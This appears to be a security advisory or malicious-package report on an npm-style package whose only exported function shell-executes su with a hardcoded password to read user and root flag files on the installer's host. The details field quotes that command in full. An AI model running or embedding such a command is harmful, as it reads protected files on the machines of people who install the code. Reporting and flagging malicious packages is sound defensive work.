summary: Package exports a privilege-escalation payload targeting CTF/host flag files
details: internallib_v557 ships a single exported function `command()` in index.js that shell-execs `echo "jL8P391xthN4qxqwxv" | su - internal -c "cat ~/user.txt; id"`, then `cat /opt/scripts/local_check.sh`, then `cat /root/root.txt`, capturing the output. The package has no other functionality: its sole purpose is to attempt local privilege escalation using a hardcoded `su` password and to read root-owned and other-user flag files on the installer's host. package.json is a stub with only name/version/main — no description, repository, license, or author — consistent with a single-purpose offensive package published to the public registry. Any consumer that requires this package and invokes its public API will execute the privilege-escalation shell commands on its own host.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
